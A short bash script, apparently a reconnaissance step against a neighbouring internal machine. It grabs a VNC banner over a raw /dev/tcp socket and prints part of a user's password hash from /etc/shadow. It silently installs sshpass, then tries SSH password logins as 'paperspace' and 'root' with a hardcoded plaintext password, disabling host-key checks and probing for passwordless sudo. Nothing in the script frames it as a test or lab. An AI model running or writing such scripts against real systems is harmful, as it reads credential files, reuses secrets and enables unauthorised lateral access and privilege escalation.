#!/bin/bash
# ul87804 recon3: VNC banner + ssh password entry with machine desktop password
set -u
echo "=== recon3 $(date -u +%FT%TZ) host=$(hostname -s)"
echo "== rfb .8"
timeout 6 bash -c 'exec 3<>/dev/tcp/10.140.197.8/5900; head -c 20 <&3' 2>&1 | tr -d '\0' | head -2; echo
echo "== pw shadow"
awk -F: '$1=="paperspace"{print $1":"substr($2,1,20)":"$3}' /etc/shadow
echo "== sshpass"
which sshpass 2>/dev/null || DEBIAN_FRONTEND=noninteractive apt-get install -y -qq sshpass >/dev/null 2>&1; which sshpass 2>/dev/null || echo NO-SSHPASS
P=AfewqCMKDerw
for u in paperspace root; do
  echo "-- $u @.8 pw=$P"
  timeout 20 sshpass -p "$P" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PubkeyAuthentication=no -o PreferredAuthentications=password -o ConnectTimeout=8 "$u"@10.140.197.8 'id; hostname; sudo -n true && echo SUDO-OK' 2>&1 | tail -4
done
echo "== done $(date -u +%FT%TZ)"
